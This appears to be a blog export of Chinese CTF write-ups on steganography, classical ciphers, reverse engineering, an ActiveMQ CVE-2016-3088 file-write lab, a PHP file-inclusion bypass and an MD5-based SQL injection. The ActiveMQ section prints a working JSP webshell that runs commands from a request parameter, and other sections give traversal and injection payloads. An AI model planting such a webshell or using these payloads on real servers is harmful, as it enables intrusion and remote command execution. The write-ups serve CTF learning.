[https://pan.baidu.com/s/1i49Jhlj](https://pan.baidu.com/s/1i49Jhlj)\n    \n    注意这里的字母，打开是个音频\n\n2.  音频隐写\n\n    使用audacity.exe 打开文件，然后猜测可能是莫尔斯码\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175731.png)\n\n    101 0 1011 0100 0 1 001 000 110 111 通过对莫尔斯码对比得到密码\n\n    key letusgo\n\n3.  图片隐写\n\n    使用一个web网址上传图片直接出结果，这个参考评论，我使用stegsolve 没有查看到\n\n    [http://www.atool9.com/steganography.php](http://www.atool9.com/steganography.php)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175740.png)\n\n\n    这里试了n久 没弄出来 ，之后查看了下wp 发现解密的信息错误,以下的为正确的 key{you are in finally hell now}\n    \n    这里和dalao商量了下，可能是图片的问题。\n    \n    终点\n    \n    有一个txt和一个图片，先看txt文档，0和1组成的可能是二进制，试试解字符串\n    \n    [![图片.png](https://upload-images.jianshu.io/upload_images/18851353-80915ee08664e99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    ruokouling = 弱口令\n    \n    然后查看图片 地狱大门.jpg 使用winhex 打开，在最后看到有小姐姐.txt 文件 使用kali的foremost 分离\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175748.png)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175756.png)\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175802.png)\n\n\n\n    测试发现弱口令为Password\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175809.png)\n\n    VTJGc2RHVmtYMTlwRG9yWjJoVFArNXcwelNBOWJYaFZlekp5MnVtRlRTcDZQZE42elBLQ01BPT0=\n    \n    可能是base系列\n    \n    base64 解密一次 U2FsdGVkX19pDorZ2hTP+5w0zSA9bXhVezJy2umFTSp6PdN6zPKCMA==\n    \n    rabbit 解密 一次 fxbqrwrvnwmngrjxsrnsrnhx\n    \n    凯撒 解密一次 woshinimendexiaojiejieyo\n    \n    附上凯撒解密的脚本\n```\n    # -*- coding: utf-8 -*-\n    ​\n    import os\n    ​\n    str = \"fxbqrwrvnwmngrjxsrnsrnhx\"\n    for i in range(0,26):\n     for j in str:\n     if ord(j) -i >= 97:\n     print(chr(ord(j)-i),end=\"\")\n     else:\n     print(chr(ord(j)-i+26),end=\"\")\n     print()</pre>\n```\n4.  flag\n\n    CTF{woshinimendexiaojiejieyo}\n","tags":["misc"],"categories":["CTF"]},{"title":"实验吧-逆向工程-debug","url":"/2019/10/04/CTF/实验吧/实验吧-逆向工程-debug/","content":"\n了解函数运行，合适添加断点判断，获取一闪而过的flag\n\n<!-- more -->\n\n# 实验吧\n\n## 逆向工程\n\n### debug\n\n1. 下载文件，然后用idaq打开，\n\n   ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175528.png)\n\n\n    尝试在linux下打开发现么没有返回值，\n    \n    在idaq里面去查看shift+F12 查看字符串，发现有个printing flag\n    \n    这里想着如何可以进去，\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175536.png)\n\n\n    可以看到其实位置在0x804849b\n\n2.  设置断点，查看\n\n    一般设置在main 但是main没有定义\n\n    [图片上传失败...(image-12bd86-1566818035404)] \n\n    这里查了下发现这几个可以代替\n\n    程序启动的过程应该是这样的：\n\n    _start -> __libc_start_main -> main. 具体一点就是：\n\n    _start -> **libc_start_main ->** libc_csu_init -> main. 再具体一点就是：\n\n    _start -> **libc_start_main ->** libc_csu_init -> _init -> main -> _fini.\n\n    官方点的解释：__libc_start_main sets up the environment and then calls the `main()` function when the binary is run.\n\n    所以我们设置在libc_start_main 也可以达到相同的效果\n\n3.  获取flag\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175456.png)\n\n\n    设置入口\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175505.png)\n\n\n\n    运行，之后在设置断点 ， 先 r 在 set $eip=0x804849b\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175518.png)  ![图片.png](https://upload-images.jianshu.io/upload_images/18851353-7f80c2c362487886.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n    成功拿到flag\n","tags":["reverse"],"categories":["CTF"]},{"title":"传统知识+古典密码","url":"/2019/10/04/CTF/实验吧/实验吧-密码学-传统密码+古典密码/","content":"\n多种加密结合，一步一步解密，追寻真理\n\n<!-- more -->\n\n# 实验吧\n\n## 密码学\n\n### 传统知识+古典密码\n\n1.  题目\n\n    辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳\n\n    信的背面还写有“+甲子”，请解出这段密文\n\n    key：CTF{}\n\n2.  查一下得到了一份六十甲子顺序表\n\n ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175426.png)\n\n\n\n    获取到它的值：28 30 23 8 17 10 16 30\n    \n    题目后面说`+甲子` ：88 90 83 68 77 70 76 90\n    \n    对应ascii： XZSDMFLZ\n\n3.  根据古典密码解密\n\n    首先尝试栅栏密码： XMZFSLDZ\n\n    在尝试凯撒密码：SHUANGYU\n\n4.  得到flag\n\n    CTF{SHUANGYU}\n\n5.  附上python脚本\n    ```\n     str = \"XMZFSLDZ\" \n     for i in range(0,26):                        \n         for j in str:\n             if ord(j) -i >= 65:\n                 print(chr(ord(j)-i),end=\"\")\n             else:\n                 print(chr(ord(j)-i+26),end=\"\") \n         print()\n    ```\n","tags":["crypto"],"categories":["CTF"]},{"title":"变异凯撒","url":"/2019/10/04/CTF/实验吧/实验吧-密码学-变异凯撒/","content":"\n仔细观察凯撒加密，找寻其中的规律\n\n<!-- more -->\n\n# 实验吧\n\n## 密码学\n\n### 变异凯撒\n\n> 凯撒密码\n> \n> 在[密码学](https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E5%AD%A6)中，**恺撒密码**（英语：Caesar cipher），或称**恺撒加密**、**恺撒变换**、**变换加密**，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，[明文](https://baike.baidu.com/item/%E6%98%8E%E6%96%87)中的所有字母都在[字母表](https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8)上向后（或向前）按照一个固定数目进行偏移后被替换成[密文](https://baike.baidu.com/item/%E5%AF%86%E6%96%87)。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期[恺撒](https://baike.baidu.com/item/%E6%81%BA%E6%92%92)的名字命名的，当年恺撒曾用此方法与其将军们进行联系。\n\n1.  看一下加密的密文\n\n    加密密文：afZ_r9VYfScOeO_UL^RWUc  格式：flag{ }\n\n2.  将加密的密文转成二进制\n\n    97 102 90 95 114 57 86 89 102 83 99 79 101 79 95 85 76 94 82 87 85 99\n\n3.  根据flag的格式 比较发现\n\n    f = 102，l = 108, a = 97 , g = 103\n\n    可以发现 第一位 偏移5，第二位偏移6 ， 第三位偏移7 ，第四位偏移8\n\n4.  写个python脚本跑一下\n\n    ```\n    k = 5 \n    str = 'afZ_r9VYfScOeO_UL^RWUc' \n    for i in str:                    \n     print(chr(ord(i)+k),end=\"\")\n     k +=1 \n    ```\n    结果：flag{Caesar_variation}\n","tags":["crypto"],"categories":["CTF"]},{"title":"MD5之守株待兔","url":"/2019/10/04/CTF/实验吧/实验吧-安全杂项-MD5守株待兔/","content":"\n实验吧-安全杂项-MD5之守株待兔 ，通过md5加密时间戳获取flag\n\n<!-- more -->\n\n# 实验吧\n\n## 安全杂项\n\n### MD5之守株待兔，你需要找到和系统锁匹配的钥匙\n\n做题感受，这个题难道就只能一直刷新等吗，太不亲民了\n\n1.  访问url\n\n    [http://ctf5.shiyanbar.com/misc/keys/keys.php(http://ctf5.shiyanbar.com/misc/keys/keys.php)\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175344.png)\n\n\n    查看自己的密钥，发现是空的，经过尝试后发现，需要通过get一个数，这个数代表时间，然后md5解密系统的密钥，发现是个时间戳，而且每次都会变就更加确认了。\n    \n    之后通过自己get的时间，一直刷新，基本大30 就可以获取到了。\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175352.png)\n\n\n拿到flag，直接照格式提交就行，不要和我傻得还去md5一下，然后提交几次都没有成功\n","tags":["misc"],"categories":["CTF"]},{"title":"ActiveMQ任意文件写入漏洞分析溯源","url":"/2019/10/04/CTF/墨者学院/墨者学院-web安全-ActiveMQ任意文件写入漏洞/","content":"\n\n\n# 墨者学院\n\n## WEB安全\n\n### ActiveMQ任意文件写入漏洞分析溯源\n\n#### ActiveMQ 简介\n\nActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java  的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用\n\nfileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：\n\n1.  其使用率并不高\n\n2.  文件操作容易出现漏洞\n\n#### 漏洞复现\n\n1.  访问url\n\n    ![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174915.png)\n\n\n2.  查找漏洞\n\n    搜索发现存在CVE-2016-3088 漏洞，找到分析查看漏洞原因\n\n    查询发现在ActiveMQ<5.12.x版本存在fileserver 应用，可以通过fileserver写入文件（不解析jsp文件）通过移动到任意位置，就可以造成任意文件写入漏洞。\n\n    > 文件写入的几种利用方式\n    > \n    > 1 写入webshell\n    > \n    > 2 写入 cron 或 ssh key\n    > \n    > 3 写入 jar 或 jetty.xml 等库和配置文件\n    > \n    > 写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh  key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。\n\n3.  漏洞利用\n\n    尝试写入jsp\n\n    有回显带密码验证的\n     ```\n     <% \n     if(\"023\".equals(request.getParameter(\"pwd\"))){\n     java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\n     int a = -1;\n     byte[] b = new byte[2048];\n     out.print(\"<pre>\");\n     while((a=in.read(b))!=-1){\n     out.println(new String(b));\n     }\n     out.print(\"</pre>\");\n     }\n    %>\n    请求url：http://ip:port/Shell/cmd2.jsp?pwd=023&i=ls</pre>\n     ```\n    通过burp访问，发现需要验证，需要登录，我们尝试登录，默认的ActiveMQ的账号和密码均为admin\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174936.png)\n\n\n    登录后查看http方法 ，发现没有put方法\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174945.png)\n\n\n\n    执行put方法 发现却上传成功了\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174951.png)\n\n\n    接下来通过move移动到admin或api下，就可以解析jsp文件了， 查找他的绝对路径\n    \n    > 访问url：[http://ip:port/admin/test/systemProperties.jsp](http://ip:port/admin/test/systemProperties.jsp)\n    > \n    > [图片上传失败...(image-99ffb1-1567592524169)]\n    \n    通过move方法将jsp木马移动到admin或api下，进行解析\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175000.png)\n\n    然后访问，可以执行命令，\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175021.png)\n\n\n    这里就可以直接查看flag，最后在根目录找到了flag\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175035.png)\n\n\n#### 参考链接\n\n[jsp一句话](https://www.cnblogs.com/swyft/articles/5563732.html)\n\n[ActiveMQ任意文件写入漏洞](https://www.jianshu.com/p/564fb8b54a67)\n","tags":["任意文件写入"],"categories":["CTF"]},{"title":"HCTF2018-warmup-writeup","url":"/2019/10/04/CTF/Buuoj/HCTF2018-warmup-writeup/","content":"\n\n\n# BUUCTF\n## web\n### warmup\n这里我直接上代码讲 菜鸡不会php，全是现查 哪里不对，欢迎大佬指点\n```php\n <?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page) \n        /* \n        传入了变量page，也就是我们刚刚传进来的file\n        */\n        {\n        \t// 这里定义了白名单\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n            /*2\n            为了返回 true 两个条件必须满足\n            \t1 page存在 \n            \t2 page是字符串 ，\n            \t这里和外层的判断file 一致基本是再次判断了一遍\n            */\n                echo \"you can't see it\";\n                return false;\n            }\n\t\t\t/*3\n\t\t\tin_array(search,array,type) 函数搜索数组中是否存在指定的值，\n\t\t\t白名单过滤，需要返回了ture\n\t\t\t所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，\n\t\t\t这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看\n\t\t\t*/\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\t\t\t/*\n\t\t\t这里mb_sustr 是个截断，返回0到mb_strpos之间的内容，而mb_strps 则是查找第一次出现的位置，\n\t\t\t所以基本可以理解为获取page 两个？之间的字符串，\n\t\t\t也就是获取file两个？之间的字符串，\n\t\t\t放到url中就是http://ip/?file=ddd?中的file=ddd\n\t\t\t\n            */\n            $_page = mb_substr( \n                $page,\n                0,\n                mb_strpos($page . '?',  '?')\n            );\n            if (in_array($_page, $whitelist)) { \n            //' 6 这里和上面类似 查看_page 是否在白名单中\n                return true;\n            }\n\n            $_page = urldecode($page); // 这里发现对_page进行了一次decode解码，\n            $_page = mb_substr(//获取两个？？之间的内容\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            // 这里是我们要绕过的点，从这里往上看 尝试构造\n            if (in_array($_page, $whitelist)) {//白名单\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\t/*1\n\t必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： \n\t\t1 REQUEST['file']不为空 \n\t\t2 REQUEST['file']是字符串 \n\t\t3 checkFile($_REQUEST['file']) 为ture，回到checkFile 函数分析如何返回true\n\t*/\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?>\n\n所以我们的payload 就是\nfile=source.php%253f../....//../../../ffffllllaaaagggg\nflag{bd04766d-3dfa-47bc-9b15-703a4b8cbd07} \n```\n\n经过上面的分析，大致可以看到对file的内容没有过滤，只判断了存在和字符串，所以可以使用文件包含读取flag，而关键点在_page 经过截断后返回true\n\n在检查字符串的时候使用了白名单尝试绕过 但_page只截取了？？之间的内容，所以我们可以构造 ？source.php？../../../phpinfo.php 这样来绕过过滤。\n\n接下来就是如何绕过了.\n我们的参数应该是?source.php../../../flag.txt\n而_page进行截断后判断白名单。\n我们的参数就?source.php?../../../flag.txt\n对_page判断了两个 第二次是我们的绕过点，代码对page进行了一次解码，第一次判断为false，第二次为ture\n我们的参数就变成了?source.php%253f../../../flag.txt\n>这里解释一下为什么经过了两次url编码，第一次是url传入到服务器时解码了一次，第二次是page传给_page解码了一次\n\n所以根据hint.php的提示，最终payload\nfile=source.php%253f/../../../../../ffffllllaaaagggg\n\n\n\n","tags":["web"],"categories":["CTF"]},{"title":"后台登录","url":"/2019/10/04/CTF/实验吧/实验吧-web-后台登录/","content":"\n# 实验吧\n\n## web\n\n### 后台登录\n\n1.  burp抓包尝试爆破\n\n    一般呢，ctf题是不涉及爆破的，因为这样会导致服务器处理压力太大\n\n    <pre spellcheck=\"false\" class=\"md-fences md-end-block ty-contain-cm modeLoaded\" cid=\"n16\" mdtype=\"fences\" style=\"box-sizing: border-box; overflow: visible; font-family: var(--monospace); font-size: 0.9em; display: block; break-inside: avoid; text-align: left; white-space: normal; background-image: inherit; background-position: inherit; background-size: inherit; background-repeat: inherit; background-attachment: inherit; background-origin: inherit; background-clip: inherit; background-color: rgb(248, 248, 248); position: relative !important; border: 1px solid rgb(231, 234, 237); border-radius: 3px; padding: 8px 4px 6px; margin-bottom: 15px; margin-top: 15px; width: inherit;\" lang=\"js\"><!-- $password=$_POST['password'];\n     $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n     $result=mysqli_query($link,$sql);\n     if(mysqli_num_rows($result)>0){\n     echo 'flag is :'.$flag;\n     }\n     else{\n     echo '密码错误!';\n     } --></pre>\n\n    可以看到这里当我们输入正确的密码后，会返回flag。\n\n    那么我们的重点就是获取密码了\n\n2.  寻找密码\n\n    尝试了几次弱密码，注入都没有效果，之后突然看到url：[http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php](http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php)，发现文件名很怪异，之后尝试也发现了ffifdyop就是最终的密码\n\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175235.png)\n\n 拿到flag\n\n3.  解释\n\n    为什么ffifdyop就可以拿到flag，\n\n    ffifdop\n\n    md5:  276f722736c95d99e921722cf9ed621c\n\n    然后对其编码，这里刚好构成了注入条件\n\n    `‘or’6<tarsh>`\n\n    我们查看一个md5加密\n![](https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175244.png)\n\n  \n\n    content: 129581926211651571912466741651878684928\n    hex: 06da5430449f8f6f23dfc1276f722738\n    string: T0Do#'or'8\n\n---\n\n\n\n参考：https://www.jianshu.com/p/fc7ed10d1010\n\n之后查看也发现了我们需要构造一个可以绕过的字符串，所以这道题算是瞎猫逮着了，但是做题的目录就是理解，而不是为了做题而做题。","tags":["sql注入"],"categories":["CTF"]}]